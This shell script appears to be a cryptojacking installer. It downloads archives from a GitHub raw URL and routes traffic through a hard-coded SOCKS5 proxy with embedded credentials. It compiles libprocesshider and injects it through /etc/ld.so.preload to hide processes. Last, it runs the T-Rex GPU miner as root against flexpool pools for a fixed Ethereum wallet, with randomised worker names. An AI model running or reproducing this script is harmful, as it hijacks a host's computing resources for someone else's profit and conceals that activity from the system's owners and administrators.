#!/bin/sh 
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt get install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 154.92.127.248:5907
socks5_username = ingfoingfo
socks5_password = maszZeehh
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "


./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget https://github.com/RainbowMiner/miner-binaries/releases/download/v0.24.6-trex/t-rex-0.24.6-linux.tar.gz
tar -xf t-rex-0.24.6-linux.tar.gz
chmod +x t-rex
sudo ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --keep-gpu-busy --kernel 0 --dns-https-server 1.1.1.1
